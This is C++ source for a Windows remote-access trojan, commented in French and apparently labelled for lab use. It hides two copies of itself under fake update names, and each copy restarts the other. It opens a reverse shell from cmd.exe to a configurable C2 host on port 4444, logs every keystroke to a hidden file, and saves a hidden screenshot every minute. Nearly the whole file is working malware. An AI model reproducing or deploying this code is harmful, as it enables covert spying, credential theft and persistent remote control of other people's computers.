// language: C++17, file: lexagent.cpp v2, target: Windows x64 (lab)
// L'HYDRE : copie multiple + chien de garde mutuel + mutex anti-doublon
// Supprimer une copie ne tue rien : les autres la recréent et relancent l'agent.
// Defines: LEX_C2 "host|ip"  LEX_PORT
// Cross-compile: x86_64-w64-mingw32-g++ -O2 -std=c++17 -DLEX_C2='"..."'-DLEX_PORT=4444
//                lexagent.cpp -o lexagent.exe -lws2_32 -lgdi32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <string>
#include <fstream>
#include <mutex>

#ifndef LEX_C2
#define LEX_C2 "127.0.0.1"
#endif
#ifndef LEX_PORT
#define LEX_PORT 4444
#endif

static std::mutex g_mu;
static std::ofstream g_log;

// ---------- les 2 corps de l'hydre ----------
static std::string P1() {  // copie principale (Run key pointe ici)
    char p[MAX_PATH]; GetEnvironmentVariableA("LOCALAPPDATA", p, MAX_PATH);
    return std::string(p) + "\\ArkhamLab\\ArkhamUpdate.exe";
}
static std::string P2() {  // copie de garde (tache planifiee pointe ici)
    char p[MAX_PATH]; GetEnvironmentVariableA("APPDATA", p, MAX_PATH);
    return std::string(p) + "\\Microsoft\\Updates\\msupd.exe";
}

static std::string Self() {
    char p[MAX_PATH]; GetModuleFileNameA(NULL, p, MAX_PATH);
    return p;
}

static bool ProcRunning(const char* exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe{ sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (!_stricmp(pe.szExeFile, exeName)) { CloseHandle(snap); return true; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return false;
}

static void Start(const std::string& exe) {
    STARTUPINFOA si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    CreateProcessA(exe.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
}

// le chien de garde : l'autre copie doit vivre, sinon recree et relance
static DWORD WINAPI WatchThread(LPVOID) {
    std::string self = Self(), other = (self == P1()) ? P2() : P1();
    const char* otherName = (other == P2()) ? "msupd.exe" : "ArkhamUpdate.exe";
    for (;;) {
        if (!ProcRunning(otherName)) {
            CopyFileA(self.c_str(), other.c_str(), FALSE);   // recree le corps coupe
            SetFileAttributesA(other.c_str(), FILE_ATTRIBUTE_HIDDEN);
            Start(other);
        }
        Sleep(4000);
    }
}

// ---------- payload : shell + keylogger + screenspy (identique v1) ----------
static void Shell(SOCKET s) {
    SECURITY_ATTRIBUTES sa{ sizeof(sa), NULL, TRUE };
    HANDLE inR, inW, outR, outW;
    CreatePipe(&inR, &inW, &sa, 0); CreatePipe(&outR, &outW, &sa, 0);
    SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    si.hStdInput = inR; si.hStdOutput = outW; si.hStdError = outW;
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe /q", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(s); return;
    }
    CloseHandle(inR); CloseHandle(outW);
    u_long nb = 1; ioctlsocket(s, FIONBIO, &nb);
    char buf[8192];
    for (;;) {
        DWORD avail = 0;
        while (PeekNamedPipe(outR, NULL, 0, NULL, &avail, NULL) && avail) {
            DWORD rd;
            if (!ReadFile(outR, buf, sizeof(buf), &rd, NULL) || !rd) goto dead;
            send(s, buf, rd, 0);
        }
        int r = recv(s, buf, sizeof(buf), 0);
        if (r > 0) { DWORD wr; WriteFile(inW, buf, (DWORD)r, &wr, NULL); }
        else if (r == 0 || (r < 0 && WSAGetLastError() != WSAEWOULDBLOCK)) break;
        if (WaitForSingleObject(pi.hProcess, 40) == WAIT_OBJECT_0) break;
    }
dead:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    CloseHandle(inW); CloseHandle(outR);
    closesocket(s);
}

static void ShellLoop() {
    for (;;) {
        addrinfo hints{}; hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
        addrinfo* res = nullptr;
        if (getaddrinfo(LEX_C2, std::to_string(LEX_PORT).c_str(), &hints, &res) != 0 || !res) {
            Sleep(20000); continue;
        }
        SOCKET s = socket(res->ai_family, SOCK_STREAM, IPPROTO_TCP);
        if (connect(s, res->ai_addr, (int)res->ai_addrlen) == 0) Shell(s);
        else closesocket(s);
        freeaddrinfo(res);
        Sleep(20000);
    }
}

static LRESULT CALLBACK HookProc(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT* k = (const KBDLLHOOKSTRUCT*)lp;
        char name[32] = {0};
        LONG sc = (k->scanCode << 16) | ((k->flags & LLKHF_EXTENDED) ? (1 << 24) : 0);
        GetKeyNameTextA(sc, name, 32);
        char appdata[MAX_PATH]; GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
        static std::string path = std::string(appdata) + "\\Arkham\\sys.log";
        static bool opened = false;
        if (!opened) {
            CreateDirectoryA((std::string(appdata) + "\\Arkham").c_str(), NULL);
            g_log.open(path, std::ios::app); opened = true;
        }
        std::lock_guard<std::mutex> lk(g_mu);
        if (g_log) { g_log << "[" << (int)time(NULL) << "] " << name << "\n"; g_log.flush(); }
    }
    return CallNextHookEx(NULL, code, wp, lp);
}

static DWORD WINAPI KeyThread(LPVOID) {
    HHOOK hk = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) { TranslateMessage(&msg); DispatchMessage(&msg); }
    return 0;
}

static DWORD WINAPI ScreenThread(LPVOID) {
    for (;;) {
        Sleep(60000);
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC screen = GetDC(NULL), mem = CreateCompatibleDC(screen);
        HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
        SelectObject(mem, bmp);
        BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY);
        BITMAPINFO bi{}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bi.bmiHeader.biWidth = w; bi.bmiHeader.biHeight = h; bi.bmiHeader.biPlanes = 1;
        bi.bmiHeader.biBitCount = 32; bi.bmiHeader.biCompression = BI_RGB;
        DWORD line = ((w * 32 + 31) / 32) * 4, dsz = line * (DWORD)h;
        std::string buf(dsz, 0);
        GetDIBits(mem, bmp, 0, h, &buf[0], &bi, DIB_RGB_COLORS);
        char appdata[MAX_PATH]; GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
        CreateDirectoryA((std::string(appdata) + "\\Arkham").c_str(), NULL);
        std::string path = std::string(appdata) + "\\Arkham\\scr.bmp";
        FILE* f = fopen(path.c_str(), "wb");
        if (f) {
            BITMAPFILEHEADER fh{0x4D42, (DWORD)(sizeof(fh) + sizeof(BITMAPINFOHEADER) + dsz), 0, 0,
                                sizeof(fh) + sizeof(BITMAPINFOHEADER)};
            fwrite(&fh, sizeof(fh), 1, f);
            fwrite(&bi.bmiHeader, sizeof(BITMAPINFOHEADER), 1, f);
            fwrite(buf.data(), 1, dsz, f);
            fclose(f);
            SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
        }
        DeleteObject(bmp); DeleteDC(mem); ReleaseDC(NULL, screen);
    }
    return 0;
}

// ---------- le veto du mutex : un seul agent actif, les autres = chiens de garde ----------
int main() {
    FreeConsole();
    // se copie dans les 2 corps s'il n'y est pas deja
    std::string self = Self();
    CreateDirectoryA(P1().substr(0, P1().find_last_of('\\')).c_str(), NULL);
    CreateDirectoryA(P2().substr(0, P2().find_last_of('\\')).c_str(), NULL);
    if (self != P1()) CopyFileA(self.c_str(), P1().c_str(), FALSE);
    if (self != P2()) CopyFileA(self.c_str(), P2().c_str(), FALSE);
    SetFileAttributesA(P1().c_str(), FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributesA(P2().c_str(), FILE_ATTRIBUTE_HIDDEN);

    HANDLE mutex = CreateMutexA(NULL, TRUE, "ArkhamAgentSingle");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // deja un agent actif : cette copie ne fait QUE surveiller son frere
        WatchThread(NULL);
        return 0;
    }

    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    CreateThread(NULL, 0, KeyThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenThread, NULL, 0, NULL);
    CreateThread(NULL, 0, WatchThread, NULL, 0, NULL);  // l'actif garde aussi son frere
    ShellLoop();
    WSACleanup();
    return 0;
}
